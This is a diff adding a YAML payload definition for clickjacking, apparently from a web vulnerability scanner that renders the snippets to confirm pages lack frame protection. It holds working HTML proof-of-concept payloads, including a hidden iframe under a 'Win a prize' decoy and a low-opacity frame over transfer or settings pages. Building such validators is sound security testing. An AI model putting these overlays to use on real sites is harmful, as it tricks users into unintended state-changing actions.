@@ -1,0 +1,35 @@
+family_id: clickjacking
+description: >-
+  UI-redressing (clickjacking) confirmation artifacts for pages missing
+  X-Frame-Options / CSP frame-ancestors. Header-absence alone is only a
+  screening signal — these HTML snippets are the PoC payloads the validator
+  renders in a real browser to prove the target frames and a sensitive
+  state-changing action survives the cross-site context.
+cwe_ids: [1021]
+owasp_top10:
+  - 'A05:2021'
+risk_level: low
+requires_approval: false
+oast_required: false
+payloads:
+  - id: iframe_poc_basic
+    template: '<iframe src="{target_url}" style="opacity:0.1;position:absolute;top:0;left:0;width:1000px;height:800px"></iframe>'
+    confidence: suspected
+    notes: Baseline low-opacity overlay PoC; confirms the page renders cross-origin when frame headers are absent.
+  - id: iframe_poc_decoy
+    template: '<div style="position:absolute;z-index:1">Win a prize - click here</div><iframe src="{target_url}" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>'
+    confidence: suspected
+    notes: Decoy-overlay UI-redressing PoC; the hidden iframe captures the click intended for the decoy.
+  - id: iframe_sandbox_breakout
+    template: '<iframe src="{target_url}" sandbox="allow-scripts allow-forms"></iframe>'
+    confidence: suspected
+    notes: Sandboxed iframe probe; tests whether target framebusting JS still executes under a restricted sandbox.
+  - id: form_action_clickjack
+    template: '<iframe src="{target_url}" style="opacity:0.1;width:600px;height:400px"></iframe><p>Click to continue</p>'
+    confidence: suspected
+    notes: Targets a state-changing action page (transfer/settings) framed at low opacity for click-redressing.
+mutations: []
+encodings:
+  - name: identity
+    stages: []
+    description: Raw HTML PoC snippet.
